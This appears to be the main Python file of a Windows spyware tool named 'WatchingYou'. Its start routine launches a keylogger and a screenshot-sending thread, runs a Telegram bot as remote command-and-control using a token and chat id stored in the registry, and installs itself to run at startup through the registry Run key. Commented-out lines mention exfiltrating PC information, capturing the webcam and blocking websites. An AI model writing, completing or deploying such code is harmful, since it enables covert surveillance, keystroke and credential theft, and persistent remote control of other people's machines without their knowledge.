import json
import threading  # procesos multihilos

from lib.winregistry import WinRegistry
from module.keylogger import listen_key as Keylogger
from module.controller import CONTROL
from module.screenshot import Screenshot
from module.startup import isnew, isnew_startup
from telebot.async_telebot import AsyncTeleBot
import asyncio
import cv2  # Lib IA
import os  # Lib para copiar archivos
import eel  # Entorno gráfico con HTML/ CSS / JS

from lib.pathreg import *

if __name__ == '__main__':
    print('Start WatchingYou')

    eel.init('web')  # Nombre de la carpeta

    @eel.expose
    def start_software():
        print('El software está empezando')
        # print("Is Admin?: Admin Success" if Util().is_admin() else "Is Admin?: Admin Failed")

        # if Util().is_admin():
        #     # threading.Thread(target=WebsiteBlock().block).start() # Bloquear Webs
        #     # threading.Thread(target=WebsiteBlock().reset()).start()   # Desbloquear Webs
        #     pass
        # threading.Thread(target=PCInformation().send).start()
        # threading.Thread(target=Keylogger().listen_key).start()
        # threading.Thread(target=Screenshot().send).start()
        # WebCam_IA().start()
        # WatchingYou().active()
        print("todo funcionó normal ")
        # Crea Registros
        # Modificar Registro

        threading.Thread(target=Keylogger).start()
        threading.Thread(target=Screenshot().send).start()

        try:
            bot = AsyncTeleBot(WinRegistry(REG_TELEGRAM).read_value('token'))
            id = WinRegistry(REG_TELEGRAM).read_value('id')

            CONTROL.commands(bot, id)  # Busca los comandos

            asyncio.run(bot.polling(none_stop=True, timeout=10, non_stop=True))
        except:
            print('Error Grave, no se pudo iniciar el bot, elimine ese try, y verifia el error')


        return True


    @eel.expose
    def stop___():

        # vuelve al inicio del software, tambien detener
        # WatchingYou().disabled()
        # if Util().is_admin():
        #     threading.Thread(target=WebsiteBlock().reset()).start()  # Desbloquear Webs
        # Modificar registro
        print("Se detovo todo correctamnte")
        return ""


    @eel.expose
    def start___():
        # se detiene el software confirmado
        # WatchingYou().disabled()
        # if Util().is_admin():
        #     threading.Thread(target=WebsiteBlock().reset()).start()  # Desbloquear Webs



        isnew_startup() # was used regedit RUN
        # isnew() # Was used task  spy method

        print("inicia todo el proceso ok ")
        return ""


    @eel.expose
    def exit___(self):
        # eel._shutdown
        print('Se salio del programa correctamnete ')
        # Cierra software
        os._exit(1)
        return ""


    @eel.expose
    def retorno(d):
        # WatchingYou().active()
        print('Services in Active ')
        return "true"


    @eel.expose
    def check_id(chat_id, fullname):  # Inicia todo el proceso
        # WatchingYou().write_reg_init()
        # print(chat_id)

        return  'ok' # WatchingYou().check_id(fullname, [chat_id])
    #

    eel.start('index.html', size=(950, 600))
